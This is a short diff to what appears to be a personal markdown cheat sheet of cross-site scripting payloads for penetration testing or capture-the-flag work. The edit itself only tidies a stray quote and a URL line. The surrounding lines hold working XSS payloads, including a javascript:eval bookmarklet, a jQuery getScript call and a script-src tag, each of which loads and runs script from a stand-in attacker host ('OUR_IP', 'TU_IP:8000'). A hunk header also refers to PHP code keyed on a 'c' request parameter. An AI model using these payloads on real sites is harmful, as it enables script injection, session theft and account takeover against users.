@@ -93,8 +93,6 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 <script>$.getScript("http://OUR_IP")</script>
 ```
 
->
-
 > Maybe there is a content field to enter url and redirect to our web server
 
 #### Malicious Payload
@@ -129,7 +127,6 @@ if (isset($_GET['c'])) {
 
 ```
 <script src="http://TU_IP:8000/script.js"></script>
-## or
-http://TU_IP:8000/script.js
+## or anothers exploits detected of payloadsallthethings idk
 ```
 
